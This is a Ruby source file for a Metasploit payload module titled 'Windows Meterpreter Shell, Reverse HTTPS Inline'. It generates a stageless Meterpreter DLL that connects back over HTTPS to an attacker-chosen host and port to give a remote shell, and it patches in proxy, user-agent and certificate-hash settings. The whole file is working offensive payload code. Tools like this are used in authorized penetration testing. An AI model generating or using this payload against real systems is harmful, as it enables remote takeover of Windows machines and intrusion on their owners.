##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/windows/stageless_meterpreter'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'
require 'rex/parser/x509_certificate'

module Metasploit3

  CachedSize = :dynamic

  include Msf::Payload::Windows::StagelessMeterpreter
  include Msf::Sessions::MeterpreterOptions
  include Msf::Payload::Windows::VerifySsl

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse HTTPS Inline',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Session'     => Msf::Sessions::Meterpreter_x86_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
    ], self.class)
  end

  def generate
    checksum = generate_uri_checksum(Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_CONN)
    rand = Rex::Text.rand_text_alphanumeric(16)
    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/#{checksum}_#{rand}/"

    generate_stageless_meterpreter(url) do |dll|

      # TODO: figure out this bit
      # patch the target ID into the URI if specified
      #if opts[:target_id]
      #  i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
      #  if i
      #    t = opts[:target_id].to_s
      #    raise "Target ID must be less than 5 bytes" if t.length > 4
      #    u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
      #    print_status("Patching Target ID #{t} into DLL")
      #    dll[i, u.length] = u
      #  end
      #end

      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                           datastore['HandlerSSLCert'])

      Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
        :url            => url,
        :ssl            => true,
        :ssl_cert_hash  => verify_cert_hash,
        :expiration     => datastore['SessionExpirationTimeout'].to_i,
        :comm_timeout   => datastore['SessionCommunicationTimeout'].to_i,
        :ua             => datastore['MeterpreterUserAgent'],
        :proxy_host     => datastore['PayloadProxyHost'],
        :proxy_port     => datastore['PayloadProxyPort'],
        :proxy_type     => datastore['PayloadProxyType'],
        :proxy_user     => datastore['PayloadProxyUser'],
        :proxy_pass     => datastore['PayloadProxyPass'])
    end

  end

end

